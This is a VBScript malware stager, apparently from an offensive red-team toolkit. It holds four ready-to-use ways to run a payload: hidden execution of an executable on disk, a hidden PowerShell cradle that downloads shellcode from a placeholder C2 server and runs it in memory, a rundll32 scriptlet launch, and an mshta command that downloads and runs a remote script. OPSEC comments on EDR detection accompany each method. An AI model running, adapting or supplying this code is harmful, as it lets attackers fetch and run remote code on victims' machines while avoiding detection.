' ============================================================================
' Starburst VBScript Stager - Multiple Execution Methods
' ============================================================================
' OPSEC Notes:
'   - VBScript runs via wscript.exe or cscript.exe, both monitored by EDR.
'   - Process creation chains (wscript -> powershell, wscript -> rundll32)
'     are well-known indicators.
'   - VBScript is deprecated in newer Windows versions and may be disabled.
'   - Choose the execution method that best fits your target environment.
'   - All methods create child processes that are observable.
'   - Consider using the HTA stagers instead for browser-based delivery.
' ============================================================================

' --- OPERATOR: Set payload URL or path ---
Const PAYLOAD_URL = "https://your-c2-server.com/starburst.bin"
Const PAYLOAD_PATH = "C:\path\to\starburst.exe"  ' Used by Method 1 only

' --- OPERATOR: Choose execution method by uncommenting ONE method call below ---
' Call Method1_RunExe()          ' Drop to disk and execute directly
' Call Method2_PowerShell()      ' Launch PowerShell download cradle
' Call Method3_Rundll32()        ' Use rundll32 with scriptlet
' Call Method4_Mshta()           ' Use mshta with inline VBScript

' Exit after execution
WScript.Quit 0


' ============================================================================
' METHOD 1: Direct execution of a payload already on disk
' ============================================================================
' OPSEC: Simplest method. Payload must already exist on disk.
'        wscript.exe -> payload.exe process chain is visible.
' ============================================================================
Sub Method1_RunExe()
    Dim oShell
    Set oShell = CreateObject("WScript.Shell")

    ' Run payload hidden (0 = hidden window), non-blocking (False)
    oShell.Run Chr(34) & PAYLOAD_PATH & Chr(34), 0, False

    Set oShell = Nothing
End Sub


' ============================================================================
' METHOD 2: PowerShell download cradle - in-memory execution
' ============================================================================
' OPSEC: wscript.exe -> powershell.exe is a known-malicious chain.
'        PowerShell AMSI, ScriptBlock logging, and module logging apply.
'        Base64-encoded PowerShell commands are a detection indicator.
'        Network connection from powershell.exe is logged.
' ============================================================================
Sub Method2_PowerShell()
    Dim oShell
    Set oShell = CreateObject("WScript.Shell")

    Dim sCmd
    sCmd = "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command """ & _
        "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;" & _
        "$c=New-Object Net.WebClient;" & _
        "$c.Headers.Add('User-Agent','Mozilla/5.0');" & _
        "$sc=$c.DownloadData('" & PAYLOAD_URL & "');" & _
        "Add-Type 'using System;using System.Runtime.InteropServices;" & _
        "public class K{" & _
        "[DllImport(""""kernel32"""")]public static extern IntPtr VirtualAlloc(IntPtr a,uint s,uint t,uint p);" & _
        "[DllImport(""""kernel32"""")]public static extern bool VirtualProtect(IntPtr a,uint s,uint n,out uint o);" & _
        "[DllImport(""""kernel32"""")]public static extern IntPtr CreateThread(IntPtr a,uint s,IntPtr r,IntPtr p,uint f,out uint i);" & _
        "[DllImport(""""kernel32"""")]public static extern uint WaitForSingleObject(IntPtr h,uint m);" & _
        "}';" & _
        "$a=[K]::VirtualAlloc(0,$sc.Length,0x3000,0x04);" & _
        "[Runtime.InteropServices.Marshal]::Copy($sc,0,$a,$sc.Length);" & _
        "$o=0;[K]::VirtualProtect($a,$sc.Length,0x20,[ref]$o)|Out-Null;" & _
        "$t=0;$h=[K]::CreateThread(0,0,$a,0,0,[ref]$t);" & _
        "[K]::WaitForSingleObject($h,0xFFFFFFFF)|Out-Null"""

    oShell.Run sCmd, 0, False
    Set oShell = Nothing
End Sub


' ============================================================================
' METHOD 3: Rundll32 with JavaScript scriptlet
' ============================================================================
' OPSEC: wscript.exe -> rundll32.exe chain is monitored.
'        Rundll32 loading scriptlets (SCT) is a known LOLBin technique.
'        The scriptlet URL/path is visible in command-line logging.
'        Scriptlet content may be inspected by content filters.
' ============================================================================
Sub Method3_Rundll32()
    Dim oShell
    Set oShell = CreateObject("WScript.Shell")

    ' --- OPERATOR: Host a .sct scriptlet that downloads and executes ---
    ' The scriptlet should contain a registration-free COM scriptlet that
    ' launches your payload. Example .sct content is documented in the
    ' Arsenal Kit documentation.
    Dim sSctUrl
    sSctUrl = "https://your-c2-server.com/starburst.sct"

    Dim sCmd
    sCmd = "rundll32.exe javascript:""\..\mshtml,RunHTMLApplication"";o=GetObject(""script:" & sSctUrl & """)"

    oShell.Run sCmd, 0, False
    Set oShell = Nothing
End Sub


' ============================================================================
' METHOD 4: MSHTA inline execution
' ============================================================================
' OPSEC: wscript.exe -> mshta.exe chain is monitored.
'        Inline VBScript in mshta command line is a known technique.
'        mshta.exe spawning powershell.exe adds another process link.
'        Command-line arguments are logged and inspected.
' ============================================================================
Sub Method4_Mshta()
    Dim oShell
    Set oShell = CreateObject("WScript.Shell")

    ' MSHTA with inline VBScript that launches a PowerShell cradle
    Dim sCmd
    sCmd = "mshta vbscript:Execute(""CreateObject(""""WScript.Shell"""").Run " & _
        """""powershell -NoP -W Hidden -Exec Bypass -Command """"""""" & _
        "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;" & _
        "IEX((New-Object Net.WebClient).DownloadString('" & PAYLOAD_URL & "'))" & _
        """""""""""""", 0, False:close"")"

    oShell.Run sCmd, 0, False
    Set oShell = Nothing
End Sub
